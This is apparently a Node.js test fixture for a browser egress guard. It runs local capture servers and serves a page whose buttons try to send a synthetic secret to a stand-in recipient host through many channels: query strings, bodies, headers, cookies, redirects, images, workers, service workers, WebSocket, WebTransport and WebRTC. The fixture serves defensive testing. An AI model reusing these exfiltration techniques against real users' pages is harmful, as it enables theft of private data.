/**
 * Disposable capture oracle for the native EGRESS journey. No model/provider calls.
 * Server silence alone is not a passing gate: pair each assertNoCapture() with a
 * browser-native denial/attempt receipt for the same case in the journey artifact.
 */
import { createServer } from "node:http";
import { createHash, randomUUID } from "node:crypto";
import assert from "node:assert/strict";

export async function createEgressFixture() {
  const secret = `aux-private-${randomUUID()}`;
  const captures = [];
  const servers = [];
  const sockets = new Set();
  const origins = {};
  const cases = new Set([
    "same-origin", "public-recipient", "page-content", "secret-url", "secret-body", "secret-same-origin",
    "secret-header", "secret-cookie", "redirect-secret", "redirect-public", "subresource-secret", "worker-secret",
    "service-worker-secret", "websocket-protected", "websocket-existing", "webtransport-protected", "webrtc-protected", "recipient-substitution", "cancelled-request", "late-after-cancel",
  ]);
  const captureUrl = (role, name, value) => `${origins[role]}/capture?case=${name}${value ? `&value=${encodeURIComponent(value)}` : ""}`;
  for (const role of ["source", "recipient", "substitution"]) {
    const server = createServer(async (req, res) => {
      const url = new URL(req.url, origins[role]);
      res.setHeader("Access-Control-Allow-Origin", "*");
      res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
      res.setHeader("Access-Control-Allow-Headers", "X-Private");
      res.setHeader("Cache-Control", "no-store");
      if (req.method === "OPTIONS") { res.writeHead(204).end(); return; }
      if (url.pathname === "/capture") {
        const name = url.searchParams.get("case");
        if (!cases.has(name)) { res.writeHead(400).end(); return; }
        let byteCount = 0;
        const digest = createHash("sha256").update(req.url).update(JSON.stringify(req.rawHeaders));
        for await (const chunk of req) { byteCount += chunk.length; digest.update(chunk); }
        // Record bounded metadata only. Raw URL/body and synthetic value stay out of evidence.
        captures.push({ role, case: name, method: req.method, byteCount, digest: digest.digest("hex"), at: Date.now() });
        res.setHeader("Content-Type", "text/plain");
        res.end("Captured"); return;
      }
      if (role !== "source") { res.writeHead(404).end(); return; }
      if (url.pathname === "/redirect") {
        const name = url.searchParams.get("case");
        if (!["redirect-secret", "redirect-public", "recipient-substitution"].includes(name)) { res.writeHead(400).end(); return; }
        const target = name === "recipient-substitution" ? "substitution" : "recipient";
        res.writeHead(302, { Location: captureUrl(target, name, name === "redirect-secret" ? secret : undefined) }).end(); return;
      }
      if (url.pathname === "/worker.js" || url.pathname === "/service-worker.js") {
        res.setHeader("Content-Type", "application/javascript");
        const service = url.pathname === "/service-worker.js";
        const target = captureUrl("recipient", service ? "service-worker-secret" : "worker-secret", secret);
        res.end(service
          ? `self.addEventListener('install',e=>e.waitUntil(fetch(${JSON.stringify(target)})));`
          : `fetch(${JSON.stringify(target)}).finally(()=>self.close());`); return;
      }
      if (url.pathname !== "/") { res.writeHead(404).end(); return; }
      res.setHeader("Content-Type", "text/html; charset=utf-8");
      const buttons = [...cases].map(name => `<button id="${name}" type="button">${name}</button>`).join("\n");
      res.end(`<!doctype html><meta charset="utf-8"><title>EGRESS capture fixture</title>
<h1>Protected browser request journey</h1><p id="source-prose">The selected meeting schedule must stay under the requested recipient review.</p>
${buttons}<output id="attempt"></output><script>
const secret=${JSON.stringify(secret)}, origins=${JSON.stringify(origins)};
const url=(role,name,value)=>origins[role]+'/capture?case='+name+(value?'&value='+encodeURIComponent(value):'');
const attempt=document.getElementById('attempt');
const send=(target,body)=>fetch(target,body?{method:'POST',body}:{}).catch(()=>{});
const actions={
 'same-origin':()=>send(url('source','same-origin'),'public query'),
 'public-recipient':()=>send(url('recipient','public-recipient'),'public query'),
 'page-content':()=>send(url('recipient','page-content'),document.getElementById('source-prose').textContent),
 'secret-url':()=>send(url('recipient','secret-url',secret)),
 'secret-body':()=>send(url('recipient','secret-body'),secret),
 'secret-same-origin':()=>send(url('source','secret-same-origin'),secret),
 'secret-header':()=>fetch(url('source','secret-header'),{headers:{'X-Private':secret}}).catch(()=>{}),
 'secret-cookie':()=>{document.cookie='auxPrivate='+secret+'; Path=/capture';send(url('source','secret-cookie')).finally(()=>{document.cookie='auxPrivate=; Max-Age=0; Path=/capture';});},
 'redirect-secret':()=>send('/redirect?case=redirect-secret'),
 'redirect-public':()=>send('/redirect?case=redirect-public'),
 'recipient-substitution':()=>send('/redirect?case=recipient-substitution'),
 'subresource-secret':()=>{const image=new Image();image.src=url('recipient','subresource-secret',secret);document.body.append(image);},
 'worker-secret':()=>new Worker('/worker.js'),
 'service-worker-secret':()=>navigator.serviceWorker.register('/service-worker.js').catch(()=>{}),
 'websocket-protected':()=>{const socket=new WebSocket(url('recipient','websocket-protected',secret).replace('http:','ws:'));socket.onerror=()=>{};},
 'websocket-existing':()=>{window.existingSocket=new WebSocket(url('source','websocket-existing').replace('http:','ws:'));window.existingSocket.onerror=()=>{};},
 'webtransport-protected':()=>{try{const transport=new WebTransport(url('recipient','webtransport-protected',secret).replace('http:','https:'));transport.ready.catch(()=>{});transport.closed.catch(()=>{});}catch{}},
 'webrtc-protected':async()=>{try{window.egressPeer=new RTCPeerConnection({iceServers:[]});window.egressPeer.createDataChannel('protected');await window.egressPeer.setLocalDescription(await window.egressPeer.createOffer());}catch{}},
 'cancelled-request':()=>send(url('recipient','cancelled-request'),'public query'),
 'late-after-cancel':()=>setTimeout(()=>send(url('recipient','late-after-cancel',secret)),500),
};
for(const [name,run] of Object.entries(actions))document.getElementById(name).onclick=()=>{attempt.textContent=name;run();};
</script>`);
    });
    server.on("upgrade", (req, socket) => {
      const url = new URL(req.url, origins[role]);
      const name = url.searchParams.get("case");
      if (!["websocket-protected", "websocket-existing"].includes(name)) { socket.destroy(); return; }
      captures.push({ role, case: name, method: "UPGRADE", byteCount: 0,
        digest: createHash("sha256").update(req.url).digest("hex"), at: Date.now() });
      const key = req.headers["sec-websocket-key"];
      if (typeof key !== "string") { socket.destroy(); return; }
      const accept = createHash("sha1").update(key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11").digest("base64");
      socket.write("HTTP/1.1 101 Switching Protocols\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Accept: " + accept + "\r\n\r\n");
      sockets.add(socket);
      socket.on("error", () => {});
      socket.on("close", () => sockets.delete(socket));
      // No raw frames are retained. This open socket is the pre-lease refusal control.
      socket.on("data", () => {});
    });
    await new Promise((resolve, reject) => { server.once("error", reject); server.listen(0, "127.0.0.1", resolve); });
    const address = server.address();
    origins[role] = `http://127.0.0.1:${address.port}`;
    servers.push(server);
  }
  return {
    url: `${origins.source}/`, origins, secret,
    snapshot: () => captures.map(record => ({ ...record })),
    count: name => captures.filter(record => record.case === name).length,
    assertNoCapture(name) { assert.equal(captures.filter(record => record.case === name).length, 0, `Unexpected transmitted request for ${name}`); },
    assertCaptured(name, role = "source", count = 1) {
      const matching = captures.filter(record => record.case === name);
      assert.equal(matching.length, count, `Capture count for ${name}`);
      assert.ok(matching.every(record => record.role === role), `Wrong recipient for ${name}`);
    },
    async close() {
      for (const socket of sockets) socket.destroy();
      sockets.clear();
      await Promise.all(servers.map(server => new Promise(resolve => { server.close(resolve); server.closeAllConnections(); })));
    },
  };
}
